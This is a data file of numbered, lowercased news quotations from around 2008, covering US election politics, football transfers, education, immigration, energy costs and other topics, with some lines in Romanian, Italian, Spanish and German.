7545692 i simply wouldnt have the imagination to come up with the kind of senseless soul crushing ideas that constitute contemporary mathematics education
7545693 im just not sure everyone can teach algebra so that the kids understand it and make it fun
7545694 scant attention has been paid to this critical issue and californias approach to math instruction still doesnt add up
7545695 my fear is its going to turn kids off and contribute to the dropout rate
7545696 we would not want to put an age level on it
7545697 some kids are not ready for algebra in the eighth grade
7545698 weve seen over the years if you try to accelerate that it just doesnt work at redwood we saw a lot of kids that came in and then had to repeat it again in the ninth grade
7545699 the kids are leaving fourth grade now that will be required systemwide to take the eighth grade algebra 1 test
7545700 we have three years to get them to grade level
7545701 stand firm in your refusal to remain conscious during algebra in real life i assure you there is no such thing as algebra
7545702 algebra the intensive study of the last three letters of the alphabet
7545703 the fact is that there is nothing as dreamy and poetic nothing as radical subversive and psychedelic as mathematics
7545704 i dont know anybody who uses algebra but im not hanging out with architects and engineers
7545705 algebra is the gateway to critical thinking pivotal for success in science engineering and technology
7545706 i was more interested in solving the mystery of the maidenform bra than i was in alge bra but the teachers got through to me
7545707 algebra definitely set me on a path to study the humanities literature and philosophy hold many complex concepts that lead to better critical thinking
7545708 at the risk of perpetuating the stereotype of librarians id be glad to state on the record that algebra is uniquely useless in life and that the only good number is a call number
7545709 i am 77 years old a retired priest of the episcopal church i nearly died trying to do algebra in 1946
7545710 what is always to be hoped is that the instructor will reach the kids natural curiosity math is actually fun and it is easy
7545711 we dont know who kidnapped them there is a rebel group which kidnaps for ransom separate from rivals who have political objectives
7545712 we shall do all that is possible to save them

7545770 if a company is doing badly then you blame the managing director so it is right and fair that the coach be held responsible i know people are angry and rightfully so
7545771 i am prepared to take all that responsibility for the good of the team i still back the players do they suddenly become bad players or is there something else wrong
7545772 we should have won the opportunities were there but we just let them slip
7545773 im not going to panic because having watched the video again i saw how great we played
7545774 i want to do my best and try to make it permanent
7545775 i had a few options but i chose sunderland because of the manager the club has big ambitions and really good players
7545776 i feel like i have a point to prove because i think i can do really well in the premier league and show people i can score goals in this division
7545777 the way i play my game i think i am made for england
7545778 el hadji called me he had a few words with me and said the ambition at the club is good so i said good
7545779 its a good lively forward line with me and el hadji and dont forget about kenwyne jones as well and plenty of other players who are quality
7545780 nobody expects sunderland to be a good team but i know the boys now and we want to show people that we are a good club and that we can go and do well
7545781 we can surprise a lot of teams like we did against tottenham
7545782 it was a surprise for me to score on my debut and i was very happy for the guys for the manager and for the people who support me

7545812 the woman who had dominated discussions for so long could no longer lead debates or keep up with the thread of a drinks party conversation
7545813 on bad days she could hardly remember the beginning of a sentence by the time she got to the end

7545819 dozens of new families can now come live in hebron only if we renovate this building quickly
7545820 thats true but the u s government has no right to use political considerations when judging humanitarian and non profit needs the right of jews to live in hebron or new york should be protected
7545821 tomorrow the president may be in favour of it settlements and that would put all the non profits at the mercy of politics
7545822 we are not a political organisation we are doing humanitarian work and were doing humanitarian work in judea and samaria
7545823 injecting extraneous political issues into what should be a purely humanitarian issue will open a pandoras box for every charitable organisation in the united states
7545824 government budgets would not suffice to create all the services and facilities that the pioneering residents of ariel would need
7545825 we dont deal with politics we deal only with the welfare of the people that is what the irs demands
7545826 regarding u s policy on settlements its clear its the right policy to try to help bring about a political settlement between israel and the palestinians
7545827 are you saying you can get a charitable deduction for helping starving people in new york city but you cant get a charitable deduction for helping starving people in judea and samaria
7545828 either they stop the settlements or they stop talking about a two state solution

7545832 then my computer had to reboot and when it came back up and i started synth again it didnt show the synth i had made
7545833 note that any synths in progress when we go down will need to be repeated
7545834 fix the damn thing and leave my private life out of it okay pal
7545835 forget the cods gil this guys gonna need a sturgeon
7545836 hey big boy youre really a game fish whats your name
7545837 a knitwear brand that uses the inner down of the canadian arctic musk ox
7545838 ready to attack another non christian country like iran because theyre
7545839 i believe in natural gas as a clean cheap alternative to fossil fuels
7545840 she knows it natural gas is a fossil fuel but includes it because compared to other fossil fuels coal and oil it burns more cleanly
7545841 freezing in the dark money power politics and the vast left wing conspiracy
7545842 a philosophy of failure the creed of ignorance and the gospel of envy its inherent virtue is the equal sharing of misery
7545843 it was more like a mental hospital without doctors or nurses
7545844 the soros mishmash of leftist causes at home ranged from financing the anti gun lobby to abolishing capital punishment from anti israel activism to promoting abortion rights from feminism population control and gay liberation to anti corporate campaigns radical theories of education and replacing national sovereignty with global institutions
7545845 hard work duty and obligation self reliance high levels of national pride pro life values rejection of homosexuality belief in the importance of religion and god in ones life and that children should learn respect and obedience
7545846 any leader with an energy record as derelict as speaker pelosis ought to step down where she once was just incompetent and irresponsible she has now with her latest scheme to fix oil prices become dangerous
7545847 mr biden who sought the democratic presidential nomination himself this year before pulling out after performing poorly in the first contest in iowa has shown himself to be a tough political brawler a characteristic that many democrats say mr obama has not displayed against mr mccain that is something that presidential candidates typically look for in a running mate
7545848 i think he obama can be ready but right now i dont believe he is the presidency is not something that lends itself to on the job training
7545849 i would be honored to run with or against john mccain because i think the country would be better off
7545850 the first mainstream african american who is articulate and bright and clean and a nice looking guy
7545851 you cannot go to a 7 eleven or a dunkin donuts unless you have a slight indian accent
7545852 the gains from economic growth skew heavily toward the wealthy
7545853 last may he claimed that kansas tornadoes killed a whopping 10 000 people
7545854 over the last 15 months weve traveled to every corner of the united states ive now been in 57 states i think one left to go
7545855 there was something stirring across the country because of what happened in selma alabama because some folks are willing to march across a bridge so they got together and barack obama jr was born
7545856 a new day is dawning our country is at a turning point this is a time of great possibility across the land people are coming together to reshape our nations priorities to make government of by and for the people a reality
7545857 from the midwest to the south from coast to coast in big cities and rural communities voters have turned out in record numbers for change
7545858 while wages remain flat the costs of basic necessities are increasing the cost of in state college tuition has grown 35 over the past five years health care costs have risen faster than wages
7545859 voters are demanding a new kind of politics to rebuild our country for the common good a democratic spirit of unity is inspiring millions to get involved
7545860 we hold these truths to be self evident that all men are created equal that they are endowed by their creator with certain unalienable rights that among these are life
7545861 fortunately eleventh hour use by tennessee senate candidate harold ford of his campaign chairmans assertion that democrats both love and fear god while republicans only fear god has publicly opened the way in american politics for freely talking about a nearly tabooed subject for politicians their love versus respect for god but fear of the lord is a matter of salutary wholesome fear not demeaning servile fear without respect for gods rights the democrats claim to love god is a bold lie the democrats simply didnt think it through but the republicans thus far have amazingly rescued the democrats from hoisting themselves by their own petard a la fords mistake by not hammering the dems record of total disrespect for gods rights over fetal life as prime evidence the democratic leaders do not respect god
7545862 we need to ensure that we learn the lessons of those two events and that we continue to strengthen an integrated process to defend ourselves against these kinds of intrusion
7545863 its critical to our mission that we are comfortable that we have a secure network that its resilient to probes and attacks and that it will be able to sustain good decision making for the nations leaders
7545864 all of those have to come together in a unified effort if we are to maintain adequate defense against those who might intrude to our networks and try to disrupt them its a big challenge
7545865 if you are going to be successful at defending it you have to have strong and close integration among the various agencies
7545866 because this is such a broad area and it touches so many different elements of our society business medical care information certainly military and economic many of those same organizations are struggling with how do you pull them together in a more coherent fashion
7545867 im not as worried that a cold war relationship is returning so much
7545868 those are things we have to pay attention to but i think it is important not to swing the pendulum too much in an alarmist fashion
7545869 i dont see a threat to the nation coming from the arctic
7545870 but i do see security concerns that will arise as you have nations compete for resources as you have nations compete for passage as you have commercial interests competing for passage through the area all of those have a security element and i think we just have to have a good discussion about it
7545871 if we believed we have solved the problem we are almost guaranteeing it will come back you cant take your eye off the ball in this kind of a situation
7545872 we are seeing a team now that is closer knit than maybe ever before
7545873 those days are gone we are working hand in hand
7545874 we are seeing now a synergy that is really strong
7545875 on any given day one of them will be our highest priority
7545876 what keeps me awake is making sure that our team is focused on the many threats out there and not taking any one for granted not leaving any one unobserved
7545877 for the first time in gonzales versus carhart the supreme court upheld a federal ban on abortions with criminal penalties for doctors
7545878 a concerted effort to roll back the hard won rights of american women
7545879 well uh you know i think that whether youre looking at it from a theological perspective or uh a scientific perspective uh answering that question with specificity uh you know is is uh above my pay grade
7545880 these landmark agreements signal the arrival of utility scale pv solar power that may be cost competitive with solar thermal and wind energy
7545881 are becoming borderline of even being able to build next year
7545882 if you take it away it doesnt mean that every project that is proposed for 2009 necessarily dies but you do have to rethink the economics
7545883 what weve heard from the global companies involved is that it makes a lot more sense where theres a clear long term commitment to technology
7545884 given 90 percent of congress supports the policy a lot of participants in the industry have trouble figuring out whats taking so long
7545885 its pure partisanship both parties are more focused on scoring political points
7545886 because it is a presidential election year as you know it gets crazy with each political party trying to ruin public perceptions of the other
7545887 we felt that was the central issue in the cases
7545888 it could impact whether the other issues need to be heard
7545889 we think theres a good case to be made that the building of lake lanier was for water supply
7545890 its not about water supply but about operating lake lanier
7545891 what does that mean more water out less water out
7545892 given the decline in u s citizens who are going into engineering we really want to get kids fired up about it
7545893 i think you get a feel for a lot of different aspects of engineering
7545894 it was up to the students in terms of how they wanted to build everything but then we went back and asked questions after the fact everyone got the benefit of instruction afterwards
7545895 you could just hear the last stick crack and it was catastrophic
7545896 its a lengthy selection process that is similar to applying to a service academy or an rotc scholarship
7545897 we see it as part of the solution to not enough kids going in to study engineering and science
7545898 the sports and exhibition authority disputes any suggestion that it was lax in its control of the budget or that it rushed the project to completion
7545899 being behind by seven weeks pushed work scheduled for summer fall into winter causing increased costs and a decrease in productivity
7545900 disputes any suggestion that it was lax in its control of the budget or that it rushed the project to completion
7545901 when the general public thinks it could happen to me it has a big impact
7545902 we spend millions of dollars a year on safety and training we push the programs and you are still seeing a lot of premier crane companies right now having some very big accidents i pray for these guys
7545903 the basic question is whether this is something that was an isolated incident or was this a revealer of a trait of this person
7545904 we are basically going to take responsibility for what we did
7545905 more attention needs to be given across the construction industry to the training of such workers
7545906 we receive one penny on the state sales tax for all these projects
7545907 dubuque county right to life inc and our friends will fight vigorously to educate the public about the misinformation campaign and truth of planned parenthood
7545908 and will do everything in our power to continue to protect the rights of the unborn as well as the citizens of dubuque
7545909 this organization has a pattern of infiltrating the community by saying but we dont do abortions experience with this industry giant tells us it is only a matter of time they work by wedging themselves quietly into the community and then simply adding services like surgical abortions
7545910 we are moderating the pace of construction and rescheduling our opening date for the last quarter of 2010
7545911 with the current challenges within the real estate and debt capital markets which are out of our control we both anticipated and planned for this
7545912 one developers stock has dropped almost 50 due to investor concern about debt and sagging markets
7545913 it wont do anything for his condition but itll keep the sheets off his legs
7545914 the princely sum of 31 000 rupees 720 for the 8 gigabyte iphone and 36 100 rupees 840 for the 16 gb version was too high for even such a cool gizmo
7545915 if that seat is to be filled it would be preferable for the person to be not readily identifiable as a member of any single faction including our team
7545916 we are going to continue our enforcement of immigration law whether it is convenient for people or whether its not convenient
7545917 congress has mandated that we enforce these laws and that is what we intend to do
7545918 it seems to me ice used this as nothing more than a publicity ploy as a means to justify their harsh enforcement of immigration law
7545919 immigration judges should have the tools necessary to control their courtrooms and protect the adjudicatory system from fraud and abuse
7545920 this proposed rule seeks to preserve the fairness and integrity of immigration proceedings and increase the level of protection afforded to aliens in those proceedings
7545921 prejudicial to the administration of justice or undermines the integrity
7545922 is now the seat of individuals who were appointed illegally and that means that in the minds of many people the court symbolizes illegality
7545923 the fact that the process was flawed does not mean that the immigration judges selected through that process are unfit to serve
7545924 theyre looking for cases that are not just run of the mill five illegal aliens employed by joes construction company
7545925 in fact its almost 100 percent more this year than it was the previous two years
7545926 theres no question theres a variety of suggestions that people are in fact returning
7545927 remittances which is the money immigrants send home to mexico have gone down dramatically over the past year again probably part the economy but also part enforcement leading to fewer people being here
7545928 i live day by day i ask god to bring a solution
7545929 were just kind of ignoring it at this point its not really an issue
7545930 going into this thing we felt we werent going to get any results
7545931 but me being here will remind people to change the law
7545932 i think it says that our government is not wanting to enforce our own laws
7545933 it sends a very clear message that america is in a crisis situation and people arent paying attention
7545934 i think that should probably tell you where the nation is going
7545935 omg help we made it through that 9 month sleep regression and my baby was only waking up once per night which believe me was a miracle by 11 months but my baby just had a birthday and is now waking up 4 times a night again help me what am i doing wrong why does my baby hate me is this ever going to end
7545936 the truth is i dont even know what steps ill do sometimes something new comes out of me and i dont even know where it came from
7545937 the only thing you can do to practice is to go out dancing since salon tango is improvised
7545938 salon tango is what people dance in the milongas dance halls its not very structured its more about the embrace its more musical with good taste elegance pauses not just technique and speed
7545939 weve been working on our choreography for three months our strength is the feeling we put into it we love to dance and that shows beyond the technique
7545940 the change has been really hard for me theres a huge difference between improvising and putting a choreography together its hard to improvise to connect as a couple
7545941 10 reasons to get excited about never having to go back to school
7545942 what appears quite heroic to me is i think he actually did everything he could to drive that vehicle out of the area so his passenger wouldnt be exposed to the danger of being shot
7545943 i dont recall an individual in his age range being the victim of a gunshot as hes driving
7545944 le putem acorda editorilor consultanta juridica inclusiv reprezentare in justitie de catre casa de avocatura cu care colaboreaza crp
7545945 pana a ajunge la o asemenea solutie putem face oficiile de negociere intre parti prin asumarea rolului de gazda pentru negocieri sau prin oferirea unor scrisori de sprijin pentru editori daca acestia considera ca le sunt de folos in negocieri sau in instanta
7545946 primavara nu se face cu recomandarea celor 500 de semne si cu formele de sprijin oferite de crp
7545947 avem nevoie de legislatie limpede ca de aer asta inseamna solidariate si de vointa industriei mass media de a face lobby eficient pentru proiecte legislative
7545948 noi nu impunem si sprijinul clubului nu se ofera automat ne implicam daca suntem solicitati pentru ca o solicitare inseamna si recunoasterea autoritatii clubului
7545949 recomandarea mea este sa se recurga in prealabil la discutii intre parti in cele multe cazuri aceasta cale amiabila de prima instanta functioneaza

7545974 curse you hasbro mattel im going home to cut up my deluxe scrabble set and feed it to the cat
7545975 on august 25 1968 seven friends and i went to red square in order to express our shame over the conduct of our government and our disagreement with the introduction of troops into czechoslovakia
7545976 we protested against the idea of using tanks to crush free speech that was the idea
7545977 now i am in czechoslovakia sic it is a free country that is following its own policies and living its own life one that a small country should live
7545978 there is something now to remember and to be cautioned about because today russian forces have occupied georgia and it is extremely important that they leave that country so that georgia can develop in its own way that they not interfere in georgias domestic affairs and that georgia perhaps with russias participation can resolve the problem of abkhazia and south ossetia but this must be settled peacefully with the participation of international observers without arms without occupation
7545979 forty years what has changed in that time almost exactly 40 years after prague its georgias turn the same scenario and the same reaction which smells of munich
7545980 back then it was called prague spring while now it is called new europe the part that lived through totalitarianism poland ukraine the czech republic slovakia and old europe which is looking around in all directions just as it did back then
7545981 now even though in our own lifetimes we have to use former soviet dissident vladimir bukovskys phrase lived to see ourselves ruled by the gestapo i think that even now that same hope exists

7545983 she won millions of votes but isnt on his ticket why for speaking the truth
7545984 sen obama has continued in the best traditions for the vice presidency by selecting an exceptionally strong experienced leader and devoted public servant sen biden will be a purposeful and dynamic vice president who will help sen obama both win the presidency and govern this great country
7545985 the most important question is is this person prepared to be president second most important question from my perspective is can this person help me govern are they gonna be an effective partner in creating the kind of economic opportunity here at home and guiding us through some dangerous waters internationally and the third criteria from me i think was independence i want somebody who is gonna be able to challenge my thinking and not simply be a a yes person when it comes to policies
7545986 perhaps the most notable example of that came in january 2007 when biden announced his second candidacy for president
7545987 rather than spending the day boasting of his qualifications biden spent much of it extricating himself from remarks he made about obama having called him the first mainstream african american presidential candidate who is articulate and bright and clean and a nice looking guy
7545988 there has been no harsher critic of barack obamas lack of experience than joe biden biden has denounced barack obamas poor foreign policy judgment and has strongly argued in his own words what americans are quickly realizing that barack obama is not ready to be president
7545989 mccains campaign is trying to raise expectations to a point obama cant possibly reach
7545990 touchy touchy feely feely said rick stafford a superdelegate and a leader of clintons minnesota campaign of the purpose of the late night meeting
7545991 people need to express their feelings one more time clinton supporters will be expressing their feelings three or four more times in the coming days
7545992 whips from each of the states met sunday afternoon to talk about what road clinton supporters should follow in the next few days
7545993 we have been getting communications from hillary telling us that she is absolutely unreserved in her support for obama said mohamed jibrell a delegate from minneapolis who worked hard for clinton during the campaign
7545994 for many of us obama would have been our second choice anyway jibrell said
7545995 i think all hillary supporters want to regain the white house and what we consider eight years of negligence
7545996 if hillary voters arent there yet theyll get there she predicted
7545997 they ask the question will there be another opportunity in our lifetimes
7545998 we understand how they feel said bill davis an obama supporter and minneapolis delegate attending his sixth national convention
7545999 but hopefully we are able to get people to understand that symbolism is one thing but lets not appear that theres a split in this party there is a worldwide audience and we need to put our best face forward
7546000 so far there has been no directive that this is what we should do said stevenson
7546001 there may be one but there hasnt been yet we may get a message from her between now and wednesday night about what she wants us to do
7546002 boqueron for hillary t shirt boqueron is a town of about 3 000 people as in most of puerto rico clinton had overwhelming support in boqueron
7546003 i told her when she was in puerto rico that i will vote you every chance i can get said rosalina ramos
7546004 the one thing we cant have is four more years of what weve had ramos said
7546005 hillary would have been the first choice of the clinton delegates said stafford of the vice presidential spot on the ticket
7546006 but if it couldnt be her joe bidens probably the least negative if he would have named a woman she wouldnt have measured up to hillary
7546007 more talking said melanie benjamin the chief executive officer of the mille lacs band of the ojibwe and a clinton supporter
7546008 thus target has a competitive advantage over wal mart in the minds of most consumers during better economic times

7546027 the price of steel to automotive applications in the u s and abroad has most probably increased by some 100 to 150 per car produced since 2007
7546028 one of the reasons tata has been able to price the nano so aggressively is because they signed contracts for five to seven years with suppliers
7546029 what theyll probably do is churn out the first few at that price and then quietly raise the price
7546030 with a car like the nano and the sort of project where you announce a certain price point it represents a huge challenge

7546037 since late april or the beginning of may weve cleaned up graffiti on lake street from the target store at the minnehaha mall to west river road two or three times
7546038 about a year and half ago we started a huge mural project to get the whole community involved especially at risk kids
7546039 were getting to the point where almost every alley in our neighborhood has been covered
7546040 taggers want a big open space and a mural takes that away plus i think the gangs who are responsible for a lot of the graffiti tend to respect work that comes from the community
7546041 we did a great mural project a few saturdays ago
7546042 near lake street and longfellow avenue where most of our volunteers were latino kids that lived on the block
7546043 people see us on the street and ask to be put on
7546044 the corcoran mural project was awarded with council member gary schiffs neighborhood project of the year this february
7546045 i was really surprised because we were competing with projects from throughout the 9th ward
7546046 i want my apartment i want to go to school i want transportation
7546047 i want these things and im capable of getting them
7546048 the day i got my passport felt like a birthday
7546049 it will be over and then who is tad after that i think hes wrestling with that
7546050 they asked me if id like to come to one of their games
7546051 i know its not a date but that made me feel good
7546052 i just want to be left alone pay my rent and utilities
7546053 everyone got along until the new people took over now theres nothing but trouble we feel like vermin that have got to be rid of because we are blocking progress
7546054 we want the people who stay to have clean spaces to not have appliances on the deck
7546055 if the trailers not skirted they will need to skirt if they have cars that are unregistered they will need to get rid of them if a window is broken theyll need to repair it if a deck is falling down theyll have to repair it

7546534 and last sundays briefing was a huge talking point this whole week there has been ifs and buts and dos and donts
7546535 what i said to the team was to put it to the back of our minds because the most important thing for us is the one day series with south africa and that means standing up to be counted on tuesday

7546572 i was strongly advised that i would be handicapped if i took public financing because of the cap
7546573 the decision made by several candidate colleagues to reject the spending cap likely means that i will be spending more time interacting with voters while they will spend more time raising money
7546574 i dont know if voters will look on that favorably
7546575 candidates who are not busy raising money have more time to connect with voters additionally candidates who receive less private contributions are less likely to be beholden to their contributors
7546576 the only time obscene amounts of money make a difference is when interests decide they want to slander somebody

7546584 the world today is in need of mutual understanding inclusiveness cooperation and harmonious development
7546585 the beijing olympic games is a testimony of the fact that the world has its trust rested upon china
7546586 i really hope people remember the friendliness of the chinese our happy attitudes and our welcoming ways

7546714 we should have won the opportunities were there but we just let them slip
7546715 im not going to panic because having watched the video again i saw how great we played
7546716 i want to do my best and try to make it permanent
7546717 i had a few options but i chose sunderland because of the manager the club has big ambitions and really good players
7546718 i feel like i have a point to prove because i think i can do really well in the premier league and show people i can score goals in this division
7546719 the way i play my game i think i am made for england
7546720 el hadji called me he had a few words with me and said the ambition at the club is good so i said good
7546721 its a good lively forward line with me and el hadji and dont forget about kenwyne jones as well and plenty of other players who are quality
7546722 nobody expects sunderland to be a good team but i know the boys now and we want to show people that we are a good club and that we can go and do well
7546723 we can surprise a lot of teams like we did against tottenham
7546724 it was a surprise for me to score on my debut and i was very happy for the guys for the manager and for the people who support me

7546738 he said look at this the next hole watch this watch this and they didnt show it and hes throwing things at the television hes a live wire and hes definitely a force that this team has felt positively
7546739 i think anybody that gets 4 points is bloody good
7546740 but to be the youngest on the team and to have that effervescent personality that he does adds a great deal to our team and a very reliable character

7546757 non trovo che vi sia nulla di male nel reprimere la guida in condizioni non propizie dice benedetto della vedova riformatori liberali pdl per non posso non rilevare una cosa ci sono condizioni di legge che prevedono il tasso massimo di alcol oltre il quale non si pu guidare ne abbiamo discusso a lungo in parlamento mentre non riesco a capire su quali basi si appoggino questi test per le sostanze stupefacenti
7546758 esiste un tasso minimo consentito mi chiedo per il principio attivo della cannabis che consenta di guidare in condizioni di sicurezza o di altre sostanze lidea del test antidroga non mi sconvolge credo per che vada approfondito laspetto normativo
7546759 se non esistono tassi minimi definiti per legge pu capitare che uno venga denunciato solo perch gli hanno trovato delle tracce di uno spinello fumato il giorno prima anche se quelle tracce non interferiscono con i riflessi mentre ad una persona lenta di riflessi che non passerebbe mai e poi mai un test di reazione agli stimoli non accadr mai nulla e poi c un altro rischio
7546760 i test antidroga per chi guida potrebbere diventare uno screening generalizzato sulle sostanze indipendentemente dalla loro nocivit si crea un data base di persone che hanno usato una sostanza senza che questa abbia mai interferito sulla sicurezza nella guida e ragionevole fare prevenzione ma vorrei capire in che quadro giovanardi vuole inserire la sua iniziativa deve avvenire lo stesso per le sostanze altrimenti finiamo su un terreno scivoloso

7546775 puede que la apertura comercial haya aplanado el mundo pero los nuevos costos del transporte lo est n volviendo m s redondo
7546776 en un mundo con un precio del petr leo de tres d gitos no son las barreras arancelarias sino los ascendentes costos del transporte los que constituyen el mayor obst culo para el comercio
7546777 creo que todas las compa as estadounidenses est n en este momento reconsiderando seriamente lo que les est costando la cadena de reabastecimiento que actualmente proviene de china y de otros pa ses asi ticos
7546778 en el mundo de hoy en d a la distancia s bitamente comenz a valer mucho pero mucho dinero
7546779 el considerablemente dram tico cambio en el costo del barril de petr leo y el subsiguiente efecto domin que estamos viendo nos han llevado a revaluar una serie de cosas
7546780 en lo que concierne a la manufactura estos precios han fortalecido la noci n de que es mejor construir donde vendes lo que estamos en rgicamente tratando de hacer es garantizar que en todos los mercados emergentes podamos expandir nuestra posibilidad de conseguir el suministro de los productos localmente

7546784 china no puede seguir con el mismo grado de super vit comercial que ha estado registrando hasta ahora y eso iba a resolverse ya sea a trav s de un movimiento al alza por parte de la moneda china o un incremento en los precios de los productos y las dos cosas est n sucediendo
7546785 a eso hay que sumar los altos costos del transporte lo cual hace sumamente dif cil el acto de exportar productos masivos y estas son industrias que probablemente el pa s terminar perdiendo

7546815 when you live out here in northern california and you tell people youre doing an ad for mccain even if its an assignment for adweek you become the invisible man
7546816 rather than simply writing two executions on senator mccain and senator obama we decided to add a bit of this industrys context in the mix
7546817 over 100 years of experience its lasted a depression two world wars the korean conflict the cold war civil rights vietnam an oil shock and the tearing down of the berlin wall
7546818 obamaly has a funny name it is born of two continents and is largely untested great in the press gives fantastic conference and can inspire around the ideals of change and disruption
7546819 do we need experience a steady hand and a maverick of a day gone by or do we need new ideas a serious dose of change a smarter sharper democracy a new model
7546820 all he has to do is run against the current administration

7546822 its morning again in america but its not too late to wake up
7546823 george w had 78 percent of the evangelical vote to kerrys 21 percent mccain should just choose god as his running mate hed cinch it
7546824 barack obama and john mccain have a lot in common
7546825 theyve both done a great job being simplistic candidates appealing to the hearts not the brains of the american voters
7546826 each in their own way standing proud for what they believe
7546827 mccain has used his experience in vietnam before for political gain so why not continue to do it
7546828 there are many americans who are undecided at this point and sympathy voters are ripe for the picking
7546829 americans ogle him like a celebrity more than a candidate and this seems to work for him
7546830 so forget hillary clinton and any other true politician for a running mate obama hilton thats the ticket
7546831 political ads are stunningly bad artless humorless small minded negative and formulaic
7546832 do what political advertising has done best which is to use prejudice bias and fear to great personal advantage
7546833 we didnt dig too deep for the two campaign strategies
7546834 we just did what most voters do we looked at pictures of the two candidates
7546835 two attributes sad but true that will cause certain people to vote against them
7546836 tens of millions of people will recognize their satirical quality and reevaluate how they consume political advertising
7546837 coming to the conclusion that maybe just maybe they should pay less attention to the half truths they see on commercials and think a little more for themselves
7546838 the ultimate negative ad reduced to an indelible visual that conjures up each candidates vulnerability youth for obama and age for mccain
7546839 the ads are negative but make you don a real un cindy mccain like toothy grin
7546840 when you raise existing doubts about a candidate with their own names its hard to not gore them with it
7546841 lightweight celebrity full of hot air floating above us all
7546842 this election is a major turning point well either turn towards the future or turn back the clock
7546843 you can relive some of the worst moments of the bush presidency reenacted by mccain
7546844 to allow influencers to embrace him on their own terms
7546845 wed simply start by inserting organizations local leaders causes communities churches and everyday people who represent what he stands for
7546846 by the time we were done people could see on several levels from work and community to personal what obama stands for
7546847 and that on one or several of those levels hes standing for them
7546848 the world is behind him the way colleges and high schools rally behind their local heroes
7546849 tell the rest of your taliban boys this mavericks cleaning house
7546850 if he can do that to the taliban imagine what he can do for the economy yes mccains a man of action who tells it like it is pull his string and hear a bit of good old fashioned american wisdom

7546883 they have nothing to do with a progressive point of view
7546884 i dont think you would find anybody in the progressive movement who would say yes they are spokesmen for what we believe in
7546885 is a disaster at standing up for democrats that must be why fox hired him

7546922 we had originally intended for american idol to have four judges

7546928 there is a feeling in the air and i think the feeling is victory
7546929 it might have some effect on it but im hoping that we can come into the convention unified recognizing that the people spoke
7546930 i think what unifies the party is george bush i mean we dont need four more years of george bush and i think everybody understands that though there might be disappointment
7546931 i dont think it in any way diminishes senator obama but i also think it also sends the sign of respect to senator clinton that she deserves

7546964 it is too early to suggest sentiment is stabilising but the fact that irish consumers responded favourably to price discounting in the summer sales falling oil prices and less threatening news on interest rates means they havent entirely given up the ghost
7546965 the key question is whether the news over the next few months is going to get worse or better
7546966 while the improvement in consumer spending in august is very welcome it should be emphasised that current survey readings are still suggesting a fairly gloomy mood that is consistent with very subdued levels of spending
7546967 much of the improvement can be attributed to a more positive perception by consumers of the current buying climate
7546968 this may well reflect the impact of the summer sales
7546969 although sentiment has improved the underlying figures suggest that any recovery in confidence remains tentative
7546970 in the third set of images with phelps on the left it is clear he is really pushing hard while cavic on the right is just arriving

7546982 i quickly realized that a poor kid from the inner city could not afford such luxuries so i settled on a much more modest approach of attending at least one program each summer this more modest approach also incurred significant costs and so i began seeking help one day i received a letter from a state senator who had heard of my ambitions and wanted to help she requested me to contact her so that we can explore this further that my friends was the beginning a long friendship with state senator dina titus not only did she help me raise money for my summer programs she also mentored me and demanded that i succeed in these programs over the years i have learned so much from her about politics policy and life i have the utmost respect and loyalty for her and admire her passion to fight for her beliefs and her country
7546983 im not sure they the different national associations would allow it
7546984 countries have their own identity their own patriotism it has been mooted for a number of years by fifa at the world cup that great britain has a team it would be impractical in that sense scotland northern ireland wales even england all have their own identities so i dont think it is a starter

7546988 we have our people inside the camp and they are assessing the situation
7546989 one must always take threats seriously both those made by israel and by mr nasrallah

7546995 if they want albert riera theyll have to pay what espanyol is asking
7546996 while luis garcias possible transfer to benfica has stalled this one could be in its final hours
7546997 if someone does leave within the next 24 hours they will be replaced
7546998 there is a team which is offering what we have asked and another one which isnt but the player is interested in the one which is offering the least
7546999 team gb have just provided us with the most extraordinary platform
7547000 those guys just performed way beyond what i think any of us were expecting
7547001 its a bit crazy just looking out of the window of the plane and looking at everyone

7547003 we were looking out of the windows and everyone at heathrow was waving flags
7547004 barack obamas father was muslim and therefore according to islamic law so is the candidate in spite of the quranic verses explaining that there is no compulsion in religion a muslim child takes the religion of his or her father for muslims around the world non american muslims at any rate they can only ever see barack hussein obama as a muslim
7547005 he has to be good for arabs because he is a muslim
7547006 he cant be a christian his middle name is hussein
7547007 the symbolism of a major american presidential candidate with the middle name of hussein who went to elementary school in indonesia
7547008 dont really understand obamas family tree but what they do know is that if america despite being attacked by muslim militants on 9 11 were to elect as its president some guy with the middle name hussein it would mark a sea change in america muslim world relations
7547009 exploit his background to argue that an apostate is leading the global war on terror to galvanize sympathizers into action

7547018 sometimes as i said students are runaways parents dont know where they are
7547019 so its for the safety of the child as well as the safety of the community
7547020 looking for the good of making these children accountable its for the concern of these children getting an education
7547021 hay que preguntarse cu l es el concepto de seguridad y de mantenimiento

7547031 the framers viewed freedom from unlawful restraint as a fundamental precept of liberty and they understood the writ of habeas corpus as a vital instrument to secure that freedom
7547032 protection for the privilege of habeas corpus was one of the few safeguards of liberty specified in a constitution that at the outset had no bill of rights
7547033 well if crime fighters fight crime and fire fighters fight fire what do freedom fighters fight they never mention that part to us do they

7547048 in entertainment they see trends and they change hollywood saw that sit coms were loosening up a bit and bang reality tv was born back in the 50s westerns began to sag a bit and boom adventure films came in
7547049 weve been reluctant to do that whether its open wheel racing or stock car racing and thats to change when we start to see the benchmarks start to move south

7547052 we therefore feel that these repeated defaults and violations have forced us to withdraw our support from the ruling coalition and sit on the opposition benches
7547053 however we will play a constructive role in light of the charter of democracy and continuous struggle for restoration of judges and genuine democracy in pakistan
7547054 it basically means a realignment within the pakistani political spectrum
7547055 pakistani politics have been dominated by the military for the past nine years since ex president musharraf took over in a bloodless coup in 1999 after his resignation the sense is that the military is not going to stage another coup anytime soon given that the current head of the pakistani military has indicated that the military will keep out of politics
7547056 there are many reasons for sharifs pullout the obvious reason is of course the judges issue sharif and zardari agreed to restore the judges that pervez musharraf fired last year on november 3 when he declared an emergency in the country

7547152 die strecke ist noch recht neu f r uns und dieses jahr haben sie kurve eins wieder ge ndert es gibt viele langsame kurven und es ist nicht leicht zu berholen also sind ein gutes qualifying und ein guter start wichtiger als normal

7547159 yo necesito adem s de ministros a quienes les exijo mucho gobernadores como diosdado cabello aspirante a la reelecci n en miranda o alcaldes como pepe jos vicente rangel avalos saliente jefe del ayuntamiento de sucre o je sse chac n aspirante a suceder a rangel con quienes pueda trabajar imag nense ustedes que estos candidatos que andan por all como locos diciendo que ganar n la alcald a de petare que son los candidatos del presidente de estados unidos george bush que son los que me quieren liquidar ganen ustedes creen que podr a venir aqu a la bombilla ustedes creen que las misiones van a trabajar como est n trabajando no van a sabotearlas para echarme la culpa quieren ganar para sabotear mi gobierno para luego derrocarme

